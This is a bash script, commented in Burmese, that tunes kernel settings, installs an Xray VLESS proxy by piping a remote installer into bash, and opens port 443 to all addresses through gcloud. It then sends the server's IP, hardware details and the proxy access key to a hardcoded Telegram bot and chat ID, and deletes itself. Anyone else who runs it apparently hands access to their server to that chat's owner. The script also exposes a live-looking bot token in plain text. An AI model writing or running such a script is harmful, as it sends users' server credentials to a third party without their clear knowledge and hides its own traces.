#!/bin/bash

# --- Configuration ---
DEV_NAME="S 0 S"
TOKEN="8459816702:AAEwGWDM8S9BAyQtWGSs_DREJY3KC3lR9ow"
CHAT_ID="7130966571"
IP=$(curl -s ifconfig.me)
UUID=$(cat /proc/sys/kernel/random/uuid)
PORT=443
SNI="m.googleapis.com"

# ၁။ System Optimization (CPU & RAM)
clear
echo -e "\e[1;32m[*] Optimizing CPU & RAM Performance...\e[0m"
# Swappiness ကို လျှော့ချပြီး RAM အမြန်နှုန်းမြှင့်ခြင်း
sudo sysctl -w vm.swappiness=10
# Network Speed မြှင့်တင်ရန် BBR အသက်သွင်းခြင်း
echo "net.core.default_qdisc=fq" | sudo tee -a /etc/sysctl.conf
echo "net.ipv4.tcp_congestion_control=bbr" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p

# ၂။ Server Info ရယူခြင်း
CPU_MODEL=$(grep -m1 'model name' /proc/cpuinfo | awk -F: '{print $2}' | sed 's/^[ \t]*//')
RAM_TOTAL=$(free -m | awk '/^Mem:/{print $2}')
RAM_FREE=$(free -m | awk '/^Mem:/{print $4}')
CPU_CORES=$(nproc)

# ၃။ Xray Core ထည့်သွင်းခြင်း
echo -e "\e[1;32m[*] Installing Xray High-Performance Core...\e[0m"
bash <(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh) 2>/dev/null

# ၄။ Optimized Config ရေးသားခြင်း
cat <<EOF > /usr/local/etc/xray/config.json
{
  "inbounds": [{
    "port": $PORT,
    "protocol": "vless",
    "settings": {
      "clients": [{ "id": "$UUID" }],
      "decryption": "none"
    },
    "streamSettings": {
      "network": "ws",
      "wsSettings": { "path": "/sos-vless" }
    }
  }],
  "outbounds": [{ "protocol": "freedom" }]
}
EOF

# ၅။ Firewall & Service Start
gcloud compute firewall-rules create allow-vless-perf --allow tcp:$PORT --priority 1000 --direction INGRESS --action ALLOW --source-ranges 0.0.0.0/0 2>/dev/null
systemctl restart xray
systemctl enable xray

# ၆။ VLESS Link တည်ဆောက်ခြင်း
VLESS_KEY="vless://$UUID@$IP:$PORT?type=ws&security=none&path=%2Fsos-vless&host=$SNI&sni=$SNI#$DEV_NAME-ULTRA"

# ၇။ Telegram Notification (အချက်အလက်အစုံပါဝင်သည်)
MESSAGE="<code>._______________   .________
 |   ____/\   _  \  |   ____/
 |____  \ /  /_\  \ |____  \ 
 /       \\  \_/   \/       \
/______  / \_____  /______  /
       \/        \/       \/</code>

🚀 <b>ULTRA PERFORMANCE ACTIVE</b>

🖥 <b>CPU:</b> $CPU_MODEL ($CPU_CORES Cores)
📟 <b>RAM:</b> ${RAM_TOTAL}MB (Free: ${RAM_FREE}MB)
🌐 <b>IP:</b> <code>$IP</code>

✨ <b>VLESS KEY:</b>
<code>$VLESS_KEY</code>

ℹ️ <b>SNI:</b> <code>$SNI</code>"

curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" -d "chat_id=$CHAT_ID" -d "text=$MESSAGE" -d "parse_mode=HTML" > /dev/null

echo -e "\e[1;32m✅ Setup Complete! Info sent to Telegram.\e[0m"
rm -- "$0"
